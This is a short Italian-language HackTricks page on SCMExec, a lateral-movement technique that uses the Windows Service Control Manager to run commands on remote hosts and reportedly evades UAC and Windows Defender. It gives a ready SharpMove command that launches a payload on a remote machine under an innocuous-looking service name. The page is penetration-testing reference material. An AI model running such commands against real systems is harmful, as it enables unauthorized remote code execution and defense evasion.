# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** è una tecnica per eseguire comandi su sistemi remoti utilizzando il Service Control Manager (SCM) per creare un servizio che esegue il comando. Questo metodo può aggirare alcuni controlli di sicurezza, come User Account Control (UAC) e Windows Defender.

## Strumenti

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Riferimenti

- [1] [SharpMove - repository GitHub](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
